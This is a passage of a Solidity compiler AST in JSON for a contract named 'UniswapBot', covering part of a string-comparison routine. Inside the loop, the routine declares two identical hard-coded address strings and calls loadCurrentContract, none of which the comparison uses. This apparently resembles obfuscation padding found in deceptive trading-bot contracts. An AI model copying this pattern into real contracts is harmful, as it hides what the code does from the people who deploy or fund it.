														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 137,
															"name": "shortest",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 128,
															"src": "1257:8:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 138,
																"name": "other",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 122,
																"src": "1268:5:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$110_memory_ptr",
																	"typeString": "struct UniswapBot.slice memory"
																}
															},
															"id": 139,
															"isConstant": false,
															"isLValue": true,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "_len",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 107,
															"src": "1268:10:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "1257:21:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 141,
													"nodeType": "ExpressionStatement",
													"src": "1257:21:3"
												}
											},
											{
												"assignments": [
													144
												],
												"declarations": [
													{
														"constant": false,
														"id": 144,
														"mutability": "mutable",
														"name": "selfptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 265,
														"src": "1285:12:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 143,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1285:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 147,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 145,
														"name": "self",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 120,
														"src": "1300:4:3",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$110_memory_ptr",
															"typeString": "struct UniswapBot.slice memory"
														}
													},
													"id": 146,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_ptr",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 109,
													"src": "1300:9:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1285:24:3"
											},
											{
												"assignments": [
													149
												],
												"declarations": [
													{
														"constant": false,
														"id": 149,
														"mutability": "mutable",
														"name": "otherptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 265,
														"src": "1314:13:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 148,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1314:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 152,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 150,
														"name": "other",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 122,
														"src": "1330:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$110_memory_ptr",
															"typeString": "struct UniswapBot.slice memory"
														}
													},
													"id": 151,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_ptr",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 109,
													"src": "1330:10:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1314:26:3"
											},
											{
												"body": {
													"id": 251,
													"nodeType": "Block",
													"src": "1393:794:3",
													"statements": [
														{
															"assignments": [
																165
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 165,
																	"mutability": "mutable",
																	"name": "a",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 251,
																	"src": "1431:6:3",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 164,
																		"name": "uint",
																		"nodeType": "ElementaryTypeName",
																		"src": "1431:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 166,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "1431:6:3"
														},
														{
															"assignments": [
																168
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 168,
																	"mutability": "mutable",
																	"name": "b",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 251,
																	"src": "1443:6:3",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 167,
																		"name": "uint",
																		"nodeType": "ElementaryTypeName",
																		"src": "1443:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 169,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "1443:6:3"
														},
														{
															"assignments": [
																171
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 171,
																	"mutability": "mutable",
																	"name": "WETH_CONTRACT_ADDRESS",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 251,
																	"src": "1466:36:3",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 170,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "1466:6:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 173,
															"initialValue": {
																"argumentTypes": null,
																"hexValue": "307863303261616133396232323366653864306130653563346632376561643930383363373536636332",
																"id": 172,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1505:44:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_5270116ddce6ea9bbc0c25fe85461affe258517d80c431366a2308e1e2ce7379",
																	"typeString": "literal_string \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\""
																},
																"value": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1466:83:3"
														},
														{
															"assignments": [
																175
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 175,
																	"mutability": "mutable",
																	"name": "TOKEN_CONTRACT_ADDRESS",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 251,
																	"src": "1564:37:3",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 174,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "1564:6:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 177,
															"initialValue": {
																"argumentTypes": null,
																"hexValue": "307863303261616133396232323366653864306130653563346632376561643930383363373536636332",
																"id": 176,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1604:44:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_5270116ddce6ea9bbc0c25fe85461affe258517d80c431366a2308e1e2ce7379",
																	"typeString": "literal_string \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\""
																},
																"value": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1564:84:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 179,
																		"name": "WETH_CONTRACT_ADDRESS",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 171,
																		"src": "1683:21:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 178,
																	"name": "loadCurrentContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1027,
																	"src": "1663:19:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory) pure returns (string memory)"
																	}
																},
																"id": 180,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1663:42:3",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"id": 181,
															"nodeType": "ExpressionStatement",
															"src": "1663:42:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 183,
																		"name": "TOKEN_CONTRACT_ADDRESS",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 175,
																		"src": "1740:22:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 182,
																	"name": "loadCurrentContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1027,
																	"src": "1720:19:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory) pure returns (string memory)"
																	}
																},
																"id": 184,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1720:43:3",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"id": 185,
															"nodeType": "ExpressionStatement",
															"src": "1720:43:3"
														},
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "1778:58:3",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "1785:19:3",
																		"value": {
																			"arguments": [
																				{
																					"name": "selfptr",
																					"nodeType": "YulIdentifier",
																					"src": "1796:7:3"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "1790:5:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1790:14:3"
																		},
																		"variableNames": [
																			{
																				"name": "a",
																				"nodeType": "YulIdentifier",
																				"src": "1785:1:3"
																			}
																		]
																	},
																	{
																		"nodeType": "YulAssignment",
																		"src": "1810:20:3",
																		"value": {
																			"arguments": [
																				{
																					"name": "otherptr",
																					"nodeType": "YulIdentifier",
																					"src": "1821:8:3"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "1815:5:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1815:15:3"
																		},
																		"variableNames": [
																			{
																				"name": "b",
																				"nodeType": "YulIdentifier",
																				"src": "1810:1:3"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 165,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1785:1:3",
																	"valueSize": 1
																},
																{
																	"declaration": 168,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1810:1:3",
																	"valueSize": 1
																},
																{
																	"declaration": 149,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1821:8:3",
																	"valueSize": 1
																},
																{
																	"declaration": 144,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1796:7:3",
																	"valueSize": 1
																}
															],
															"id": 186,
															"nodeType": "InlineAssembly",
															"src": "1769:67:3"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 189,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 187,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 165,
																	"src": "1847:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 188,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 168,
																	"src": "1852:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "1847:6:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 242,
															"nodeType": "IfStatement",
															"src": "1843:300:3",
															"trueBody": {
																"id": 241,
																"nodeType": "Block",
																"src": "1855:288:3",
																"statements": [
																	{
																		"assignments": [
																			191
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 191,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 241,
																				"src": "1934:12:3",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 190,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "1934:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 196,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "31",
																					"id": 194,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "1957:1:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_1_by_1",
																						"typeString": "int_const 1"
																					},
																					"value": "1"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_1_by_1",
																						"typeString": "int_const 1"
																					}
																				],
																				"id": 193,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "1949:7:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint256_$",
																					"typeString": "type(uint256)"
																				},
																				"typeName": {
																					"id": 192,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "1949:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 195,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "1949:10:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "1934:25:3"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 199,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 197,
																				"name": "shortest",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 128,
																				"src": "1971:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 198,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "1982:1:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			},
																			"src": "1971:12:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 219,
																		"nodeType": "IfStatement",
																		"src": "1968:80:3",
																		"trueBody": {
																			"id": 218,
																			"nodeType": "Block",
																			"src": "1985:63:3",
																			"statements": [
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 216,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 200,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 191,
																							"src": "1994:4:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"id": 215,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"nodeType": "UnaryOperation",
																							"operator": "~",
																							"prefix": true,
																							"src": "2001:39:3",
																							"subExpression": {
																								"argumentTypes": null,
																								"components": [
																									{
																										"argumentTypes": null,
																										"commonType": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										},
																										"id": 213,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"leftExpression": {
																											"argumentTypes": null,
																											"commonType": {
																												"typeIdentifier": "t_uint256",
																												"typeString": "uint256"
																											},
																											"id": 211,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": false,
																											"lValueRequested": false,
																											"leftExpression": {
																												"argumentTypes": null,
																												"hexValue": "32",
																												"id": 201,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": true,
																												"kind": "number",
																												"lValueRequested": false,
																												"nodeType": "Literal",
																												"src": "2003:1:3",
																												"subdenomination": null,
																												"typeDescriptions": {
																													"typeIdentifier": "t_rational_2_by_1",
																													"typeString": "int_const 2"
																												},
																												"value": "2"
																											},
																											"nodeType": "BinaryOperation",
																											"operator": "**",
																											"rightExpression": {
																												"argumentTypes": null,
																												"components": [
																													{
																														"argumentTypes": null,
																														"commonType": {
																															"typeIdentifier": "t_uint256",
																															"typeString": "uint256"
																														},
																														"id": 209,
																														"isConstant": false,
																														"isLValue": false,
																														"isPure": false,
																														"lValueRequested": false,
																														"leftExpression": {
																															"argumentTypes": null,
																															"hexValue": "38",
																															"id": 202,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": true,
																															"kind": "number",
																															"lValueRequested": false,
																															"nodeType": "Literal",
																															"src": "2009:1:3",
																															"subdenomination": null,
																															"typeDescriptions": {
																																"typeIdentifier": "t_rational_8_by_1",
																																"typeString": "int_const 8"
																															},
																															"value": "8"
																														},
																														"nodeType": "BinaryOperation",
																														"operator": "*",
																														"rightExpression": {
																															"argumentTypes": null,
																															"components": [
																																{
																																	"argumentTypes": null,
																																	"commonType": {
																																		"typeIdentifier": "t_uint256",
																																		"typeString": "uint256"
																																	},
																																	"id": 207,
																																	"isConstant": false,
																																	"isLValue": false,
																																	"isPure": false,
																																	"lValueRequested": false,
																																	"leftExpression": {
																																		"argumentTypes": null,
																																		"commonType": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		},
																																		"id": 205,
																																		"isConstant": false,
																																		"isLValue": false,
																																		"isPure": false,
																																		"lValueRequested": false,
																																		"leftExpression": {
																																			"argumentTypes": null,
																																			"hexValue": "3332",
																																			"id": 203,
																																			"isConstant": false,
																																			"isLValue": false,
																																			"isPure": true,
																																			"kind": "number",
																																			"lValueRequested": false,
																																			"nodeType": "Literal",
																																			"src": "2014:2:3",
																																			"subdenomination": null,
																																			"typeDescriptions": {
																																				"typeIdentifier": "t_rational_32_by_1",
																																				"typeString": "int_const 32"
																																			},
																																			"value": "32"
																																		},
																																		"nodeType": "BinaryOperation",
																																		"operator": "-",
																																		"rightExpression": {
																																			"argumentTypes": null,
																																			"id": 204,
																																			"name": "shortest",
																																			"nodeType": "Identifier",
																																			"overloadedDeclarations": [],
																																			"referencedDeclaration": 128,
																																			"src": "2019:8:3",
																																			"typeDescriptions": {
																																				"typeIdentifier": "t_uint256",
																																				"typeString": "uint256"
																																			}
																																		},
																																		"src": "2014:13:3",
																																		"typeDescriptions": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		}
																																	},
																																	"nodeType": "BinaryOperation",
																																	"operator": "+",
																																	"rightExpression": {
																																		"argumentTypes": null,
																																		"id": 206,
																																		"name": "idx",
																																		"nodeType": "Identifier",
																																		"overloadedDeclarations": [],
																																		"referencedDeclaration": 154,
																																		"src": "2030:3:3",
																																		"typeDescriptions": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		}
																																	},
																																	"src": "2014:19:3",
																																	"typeDescriptions": {
																																		"typeIdentifier": "t_uint256",
																																		"typeString": "uint256"
																																	}
																																}
																															],
																															"id": 208,
																															"isConstant": false,
																															"isInlineArray": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"nodeType": "TupleExpression",
																															"src": "2013:21:3",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														},
																														"src": "2009:25:3",
																														"typeDescriptions": {
																															"typeIdentifier": "t_uint256",
																															"typeString": "uint256"
																														}
																													}
																												],
																												"id": 210,
																												"isConstant": false,
																												"isInlineArray": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"nodeType": "TupleExpression",
																												"src": "2008:27:3",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											},
																											"src": "2003:32:3",
																											"typeDescriptions": {
																												"typeIdentifier": "t_uint256",
																												"typeString": "uint256"
																											}
																										},
																										"nodeType": "BinaryOperation",
																										"operator": "-",
																										"rightExpression": {
																											"argumentTypes": null,
																											"hexValue": "31",
																											"id": 212,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": true,
																											"kind": "number",
																											"lValueRequested": false,
																											"nodeType": "Literal",
																											"src": "2038:1:3",
																											"subdenomination": null,
																											"typeDescriptions": {
																												"typeIdentifier": "t_rational_1_by_1",
																												"typeString": "int_const 1"
																											},
																											"value": "1"
																										},
																										"src": "2003:36:3",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									}
																								],
																								"id": 214,
																								"isConstant": false,
																								"isInlineArray": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"nodeType": "TupleExpression",
																								"src": "2002:38:3",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "1994:46:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 217,
																					"nodeType": "ExpressionStatement",
																					"src": "1994:46:3"
																				}
																			]
																		}
																	},
																	{
																		"assignments": [
																			221
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 221,
																				"mutability": "mutable",
																				"name": "diff",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 241,
																				"src": "2054:12:3",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 220,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "2054:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 231,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 230,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"components": [
																					{
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 224,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 222,
																							"name": "a",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 165,
																							"src": "2070:1:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "&",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 223,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 191,
																							"src": "2074:4:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2070:8:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"id": 225,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "2069:10:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"components": [
																					{
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 228,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 226,
																							"name": "b",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 168,
																							"src": "2083:1:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "&",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 227,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 191,
																							"src": "2087:4:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2083:8:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"id": 229,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "2082:10:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "2069:23:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2054:38:3"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 234,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 232,
																				"name": "diff",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 221,
																				"src": "2103:4:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 233,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "2111:1:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			},
																			"src": "2103:9:3",
																			"typeDescriptions": {
